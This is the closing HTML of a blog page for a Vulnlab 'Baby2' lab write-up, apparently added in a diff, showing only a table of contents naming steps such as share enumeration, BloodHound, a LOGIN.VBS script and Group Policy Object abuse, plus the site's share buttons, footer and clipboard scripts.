+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Baby2-Active-Directory-Exploitation-Through-Weak-Credentials-and-Group-Policy-Object-Abuse"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab Baby2: Active Directory Exploitation Through Weak Credentials and Group Policy Object Abuse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User"><span class="toc-number">1.2.</span> <span class="toc-text">User</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shares"><span class="toc-number">1.2.1.</span> <span class="toc-text">Shares</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NETLOGON"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">NETLOGON</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apps"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">Apps</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Home"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">Home</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Foothold"><span class="toc-number">1.2.2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bloodhound"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">Bloodhound</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LOGIN-VBS"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">LOGIN.VBS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROOT"><span class="toc-number">1.3.</span> <span class="toc-text">ROOT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shell-as-Amelia-Griffiths"><span class="toc-number">1.3.1.</span> <span class="toc-text">Shell as Amelia.Griffiths</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO-Abuse"><span class="toc-number">1.3.2.</span> <span class="toc-text">GPO Abuse</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/16/VL-Baby2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&text=VL-Baby2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&title=VL-Baby2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&is_video=false&description=VL-Baby2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Baby2&body=Check out this article: https://panosoikogr.github.io/2025/03/16/VL-Baby2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&title=VL-Baby2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&title=VL-Baby2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&title=VL-Baby2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&title=VL-Baby2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&name=VL-Baby2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&t=VL-Baby2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
